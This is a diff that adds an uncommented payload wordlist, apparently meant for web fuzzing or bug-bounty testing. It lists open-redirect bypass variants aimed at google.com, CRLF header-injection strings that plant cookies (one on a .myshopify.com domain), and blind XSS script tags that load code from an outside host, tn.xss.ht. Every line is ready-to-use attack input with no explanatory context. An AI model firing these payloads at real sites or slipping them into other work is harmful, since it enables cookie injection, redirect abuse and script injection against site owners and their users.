@@ -1,0 +1,21 @@
+http://google.com
+/google.com/%2F..
+/google.com
+//google.com
+//google.com/
+\\google.com
+\/google.com
+\/\/google.com
+/\google.com
+/\/\google.com
+|/google.com
+/%09/google.com
+/www.google.com/%2e%2e%2f
+%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
+xxcrlftest%0aSet-Cookie:test=test3;domain=.myshopify.com;
+<script src=//tn.xss.ht></script>
+<script%20src=//tn.xss.ht></script>
+%0d%0a
+%0d%0a%0d%0a
+\r\n
+%5cr%5cn
